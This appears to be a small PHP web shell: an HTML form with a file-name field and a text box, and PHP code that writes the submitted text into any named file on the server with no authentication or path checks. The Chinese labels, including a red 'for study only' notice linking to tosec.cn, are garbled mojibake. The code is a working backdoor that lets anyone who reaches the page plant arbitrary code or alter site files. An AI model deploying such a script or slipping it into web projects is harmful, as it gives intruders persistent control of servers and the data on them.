 <TITLE>�������</TITLE>
<form id="form1" name="form1" method="post" action="?action=set">
  <label>
  ���ݣ�<br />
  <br />
  <textarea name="text" cols="55" rows="10"></textarea>
  </label>
  <label> <br /><font color=red>���ļ�����ѧϰʹ�ã����������в�ļ����뵽<a href="http://www.tosec.cn" title="��վ��ȫ">Tosec.cn</a>������Σ��״��</font><br />
  <br />
  �ļ���:<br />
  <input name="filename" type="text" size="57" maxlength="55" />
  </label>

  <br />

  <label>
  <input type="submit" name="Submit" value="����" />
  </label>
</form>
<?
if($_GET["action"] == 'set') 
{ 
$filename = $_POST["filename"];
$love = $_POST["text"];
$fp = fopen($filename,"r");
$recontent  = fread($fp,filesize($filename));	
$handle = fopen($filename,"w");
if (is_writable($filename)) 
{ 
	if (!$handle = fopen($filename, 'a')) 
	{ 
		print "���ܴ��ļ�"; 
		exit; 
	} 
	$content = $recontent.$love;
	if (!fwrite($handle, $content)) { 
		print "����д�뵽�ļ�"; 
		exit; 
	} 
	print "����ɹ�"; 
	fclose($handle); 
} 
else 
{ 
	print "����д"; 
} 
} 
?> 